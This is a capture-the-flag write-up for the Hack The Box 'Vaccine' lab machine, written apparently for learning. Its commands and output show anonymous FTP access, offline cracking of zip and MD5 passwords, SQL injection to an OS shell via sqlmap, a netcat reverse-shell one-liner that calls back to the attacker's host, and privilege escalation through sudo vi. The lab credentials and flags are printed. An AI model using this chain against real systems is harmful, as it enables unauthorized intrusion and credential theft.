- - - 
created : 02-08-2025 

Tags : #veryeasy
- - - 
# Objective

Learn how to start.
# CONNECT

To attack the target machine, you must be on the same network.  
Connect to the Starting Point VPN using one of the following options.

It may take a minute for HTB to recognize your connection.  
If you don't see an update after 2-3 minutes, refresh the page.

I will use OpenVPN, so i download the config file, go in the same directory and execute the following command :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB]
└─$ sudo openvpn starting_point_mdn0x.ovpn 
[sudo] password di mdn0x: 
```

We can start our [Vulnerable Machine](../../../../3%20-%20Tags/Hacking%20Concepts/Vulnerable%20Machine.md).

Now we add the target IP to our /etc/hosts file, so we don't have to remember the [IP address](../../../../3%20-%20Tags/Hacking%20Concepts/IP%20address.md) every time :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 0/Meow]
└─$ sudo nano /etc/hosts
```

We add a line with the given IP and a name .
# Task 1

Besides SSH and HTTP, what other service is hosted on this box?
## Rustscan/Nmap

We use [Rustscan](../../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) and pass the result to [Nmap](../../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) with `--` :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Vaccine]
└─$ rustscan -a vaccine.htb -- -A 

Open 10.129.169.211:21
Open 10.129.169.211:22
Open 10.129.169.211:80

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.231
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MegaCorp Login
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

```

The answer is [FTP](../../../../3%20-%20Tags/Hacking%20Concepts/FTP.md) (it's port 21).
# Task 2

This service can be configured to allow login with any password for specific username. What is that username?

```bash
 anonymous
```
# Task 3

What is the name of the file downloaded over this service?

[Nmap](../../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) already told us : 

```bash
  backup.zip
```

We enter and `get` the file :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Vaccine]
└─$ ftp anonymous@vaccine.htb  
Connected to vaccine.htb.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10585|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10287|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |**********************************************************************************************************|  2533       24.64 MiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (8.05 KiB/s)
ftp> bye
221 Goodbye.
```
# Task 4

What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?

```bash
  zip2john
```

## Zip2john

We use [Zip2John](../../../../3%20-%20Tags/Hacking%20Tools/Zip2John.md) to 

```
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Vaccine]
└─$ zip2john backup.zip                        
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8

backup.zip:$pkzip$2*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip$::backup.zip:style.css, index.php:backup.zip

NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

We make the file :

```bash                                 
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Vaccine]
└─$ nano hash           

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Vaccine]
└─$ cat hash 
backup.zip:$pkzip$2*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip$::backup.zip:style.css, index.php:backup.zip

```
## John The Ripper

We run [JohnTheRipper](../../../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) to find the password for `unzip` the file :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Vaccine]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)     
1g 0:00:00:00 DONE (2025-08-02 14:35) 50.00g/s 1228Kp/s 1228Kc/s 1228KC/s 123456..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
# Task 5

What is the password for the admin user on the website?

Let's see what's in the file :

```bash
 ┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Vaccine]
└─$ unzip backup.zip   
Archive:  backup.zip
[backup.zip] index.php password: 
  inflating: index.php               
  inflating: style.css            

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Vaccine]
└─$ cat index.php
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
```
## Hashcat

We have the answer here, seems [MD5](../../../../3%20-%20Tags/Hacking%20Concepts/MD5.md), let's run [HashIdentifier](../../../../3%20-%20Tags/Hacking%20Tools/HashIdentifier.md) to confirm that :

```bash                                   
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Vaccine]
└─$ hashid                                                 
2cb42f8734ea607eefed3b70af13bbd3
Analyzing '2cb42f8734ea607eefed3b70af13bbd3'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
```

And crack it with [Hashcat](../../../../3%20-%20Tags/Hacking%20Tools/Hashcat.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Vaccine]
└─$ hashcat -a 0 -m 0 password /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

2cb42f8734ea607eefed3b70af13bbd3:qwerty789  
```

The answer is `qwerty789`.
# Task 6

What option can be passed to [SQLmap](../../../../3%20-%20Tags/Hacking%20Tools/SQLmap.md) to try to get command execution via the [SQL Injection](../../../../3%20-%20Tags/Hacking%20Concepts/SQL%20Injection.md)?

[HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)

```bash
 --os-shell 
```
# Task 7

What program can the postgres user run as root using sudo?

We have admin access on the website, which means we can see the Admin cookie/PHPSESSID. Using [Developer tools](../../../../3%20-%20Tags/Hacking%20Concepts/Developer%20tools.md), under Storage:cookies, there is the Name: PHPSESSID, and Value : 

![Pasted image 20250802144847.png](../../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250802144847.png)
## SQLmap OS Shell

The command on [SQLmap](../../../../3%20-%20Tags/Hacking%20Tools/SQLmap.md) will be like this :

```bash
 sqlmap -u “http://10.129.169.211/dashboard.php?search=any+query” --cookie=PHPSESSID="o76nlslviqlkuqkslq37gu7oig; security=low"--batch --os-shell
```

Now we open a [Netcat](../../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener :

```
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Vaccine]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
```

And we copy the [Reverse Shell](../../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) from here https://www.revshells.com/:

```
No output
os-shell> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.231 1337 >/tmp/f
```

We check the listener :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Vaccine]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.231] from (UNKNOWN) [10.129.169.211] 52408
sh: 0: can t access tty; job control turned off
$ whoami
postgres
```
## Shell Stabilization

We perform [Shell Stabilization](../../../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) to work better :

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
postgres@vaccine:/home/simon$ export TERM=xterm                                                                                                         
export TERM=xterm                                                                                                                                       
postgres@vaccine:/home/simon$ ^Z                                                                                                                        
zsh: suspended  nc -lvnp 1337                                                                                                                                                     
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Vaccine]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1337
                               reset
```
## Persistance Setting

This shell is unstable and will not work after a while so i will make a [SSH](../../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) key with [SSH-KeyGen](../../../../3%20-%20Tags/Hacking%20Tools/SSH-KeyGen.md) and `echo` that in the .ssh folder, then access on [SSH](../../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) :

```
┌──(mdn0x㉿mdn0xKali)-[~/.ssh]
└─$ ssh-keygen                  
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/mdn0x/.ssh/id_ed25519): 
/home/mdn0x/.ssh/id_ed25519 already exists.
Overwrite (y/n)? y
Enter passphrase for "/home/mdn0x/.ssh/id_ed25519" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/mdn0x/.ssh/id_ed25519
Your public key has been saved in /home/mdn0x/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:6e6IXGMatrok1v/0QWAGL1mBp16jwT2HjmJvC9OQzPM mdn0x@mdn0xKali
The key's randomart image is:
+--[ED25519 256]--+
|     ..o.        |
|     .=.         |
|    .o+=.        |
|  o .++*.o       |
|   *. * S.       |
|  .o=+ o.        |
|..o+=E+...       |
|.o o+X.+. .      |
|  oo*o+oo.       |
+----[SHA256]-----+
```

Now i can login on [SSH](../../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) :

```
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Vaccine]
└─$ ssh -i /home/mdn0x/.ssh/id_ed25519 postgres@vaccine.htb 
The authenticity of host 'vaccine.htb (10.129.169.211)' can't be established.
ED25519 key fingerprint is SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo.
This key is not known by any other names.
```

Now we need `postgres` password, we will search it in config files :

```bash
postgres@vaccine:~$ find /var/www -type f -exec grep -i 'postgre' {} \; 2>/dev/null
          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

For the answer, we can check it running `sudo -l` :

```
 postgres@vaccine:~$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

The answer is `vi`.
# Submit Flags

## Submit user flag

We can find it right after the first shell spawned on the target system :

```
$ ls
11
user.txt
$ cat user.txt
ec9b13ca4d6229cd5cc1e09980965bf7
```
## Submit root flag 

We can use `vi` since we run it as root, we open it `sudo vi /etc/posgresql/11/main/pg_hba.conf` and inside we write `: ! /bin/bash` :

```
root@vaccine:/var/lib/postgresql# cat /root/root.txt
dd6e058e814260bc70e9bbdef2715849
```

Pwned !!